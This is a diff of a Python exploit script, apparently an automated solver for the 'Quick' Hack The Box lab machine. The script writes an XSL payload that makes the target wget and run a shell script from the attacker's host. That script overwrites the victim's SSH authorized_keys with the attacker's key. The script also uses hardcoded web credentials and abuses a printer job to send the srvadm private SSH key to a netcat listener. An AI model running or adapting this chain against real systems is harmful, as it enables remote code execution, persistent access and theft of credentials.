@@ -161,11 +161,13 @@ def random_with_N_digits(n):
     range_end = (10 ** n) - 1
     return randint(range_start, range_end)
 
+random = str(random_with_N_digits(5))
+
 
 def fwritexsl(port):
     f = open("poc.xsl", "w+")
     f.write(xsl.format(
-        command='wget http://' + get_ip_address() + ':' + str(port) + '/shell.sh'))
+        command='wget http://' + get_ip_address() + ':' + str(port) + '/shell'+random+'.sh'))
     f.close()
 
 
@@ -173,8 +175,8 @@ def writessh():
     f = open("id_rsa.pub", "r")
     rsa = f.read()
     f.close()
-    f = open("shell.sh", "w+")
-    f.write('rm .ssh/* \necho "' + rsa.replace("\n", "") + '" > .ssh/authorized_keys')
+    f = open("shell"+random+".sh", "w+")
+    f.write('mkdir /home/sam/.ssh\nchmod 755 *\nrm shell.*\necho "' + rsa.replace("\n", "") + '" > .ssh/authorized_keys')
     f.close()
 
 
@@ -192,7 +194,28 @@ def create_tunnel():
 
 
 def nc():
-    os.remove("srvadm_id_rsa")
+    x = 1
+    while x < 2:
+        vhost = "http://printerv2.quick.htb"
+        job_assing = "title=code"+random+"&desc=&submit="
+        s.post(vhost + "/job.php", job_assing, headers=header)
+        log("Steg 2 complete...")
+        x = x + 1
+
+
+def symlink():
+    log("Uploading script steg 2...")
+    os.system("scp -i id_rsa code.sh sam@10.10.10.186:~/")
+    os.system('ssh -i id_rsa sam@10.10.10.186 "chmod +x code.sh"')
+    log("Excuting script...")
+    os.system('ssh -i id_rsa sam@10.10.10.186 "screen -d -m bash code.sh"')
+    log("Triggering payload")
+    try:
+        os.remove("srvadm_id_rsa")
+    except:
+        pass
+    t2 = threading.Thread(target=nc)
+    t2.start()
     os.system("nc -lnvp 9100 > srvadm_id_rsa")
     f = open("srvadm_id_rsa", "r")
     key = f.read()
@@ -203,32 +226,17 @@ def nc():
         filehandle.write(data[:-1])
 
 
-def symlink():
-    vhost = "http://printerv2.quick.htb"
-    job_assing = "title=code&desc=&submit="
-    log("Uploading script steg 2...")
-    os.system("scp -i id_rsa code.sh sam@10.10.10.186:~/")
-    os.system('ssh -i id_rsa sam@10.10.10.186 "chmod +x code.sh"')
-    log("Excuting script...")
-    os.system('ssh -i id_rsa sam@10.10.10.186 "screen -d -m bash code.sh"')
-    log("Triggering payload")
-    s.post(vhost + "/job.php", job_assing, headers=header)
-    log("Steg 2 complete...")
-
-
 def getsrvadmssh():
     global header
     vhost = "http://printerv2.quick.htb"
     creds_data = "email=srvadm%40quick.htb&password=yl51pbx"
-    s.post(vhost, creds_data, headers=header3)
+    s.post(vhost, creds_data, headers=header)
     log("Logged In successfully...")
     log("Sending 1st payload steg 1...")
-    add_printer = "title=code&type=network&profile=default&ip_address=" + get_ip_address() + "&port=9100&add_printer="
+    add_printer = "title=code"+random+"&type=network&profile=default&ip_address=" + get_ip_address() + "&port=9100&add_printer="
     s.post(vhost + "/add_printer.php", add_printer, headers=header3)
     log("Steg 1 completed...")
     log("Starting listener")
-    t2 = threading.Thread(target=nc)
-    t2.start()
     symlink()
 
 
@@ -289,6 +297,7 @@ how to use:
     And run it as root
     copy your id_rsa file and id_rsa.pub file in same folder
     and run three python sever 
+    dont used same port everytime you will get 404
     ex :- terminal one : python -m SimpleHTTPServer 9934
           terminal two : python -m SimpleHTTPServer 9940
           terminal two : python -m SimpleHTTPServer 9959
@@ -310,7 +319,7 @@ how to use:
     rce(port1)
     f = open("poc.xsl", "w+")
     f.write(xsl.format(
-        command='bash shell.sh'))
+        command='bash shell'+random+'.sh'))
     f.close()
     rce(port3)
     fetchsrvadm()
